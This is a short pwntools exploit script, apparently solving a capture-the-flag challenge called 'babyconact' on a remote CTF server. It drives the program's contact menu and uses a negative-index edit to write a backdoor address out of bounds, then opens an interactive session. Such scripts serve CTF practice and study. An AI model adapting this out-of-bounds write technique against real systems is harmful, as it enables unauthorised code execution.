from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
# p=process('./babyconact')
p=remote('t.ctf.qwq.cc',49512)
pause()
elf=ELF('./babyconact')
infos=0x4036E0
backdoor=0x0000000000401722

def show():
    p.recvuntil(b'option> ')
    p.sendline(b'1')
def create(name,val):
    p.recvuntil(b'option> ')
    p.sendline(b'2')
    p.recvuntil(b'Input contact name:\n')
    p.sendline(name)
    p.recvuntil(b'Input contact phone-number:\n')
    p.sendline(val)
def delete(index):
    p.recvuntil(b'option> ')
    p.sendline(b'3')
    p.sendline(str(index))
def edit(index,name,val):
    p.recvuntil(b'option> ')
    p.sendline(b'4')
    p.recvuntil(b'Input contact index:\n')
    p.sendline(str(index))
    p.recvuntil(b'Input contact name:\n')
    p.sendline(name)
    p.recvuntil(b'Input contact phone-number:\n')
    p.sendline(val)
for i in range(10):
    create(b'aaaa',b'bbbb')
delete(0)
payload1=b'\x56\x10\x40'
payload2=p64(backdoor)+p64(backdoor)
edit(-2,payload1,payload2)
p.interactive()
    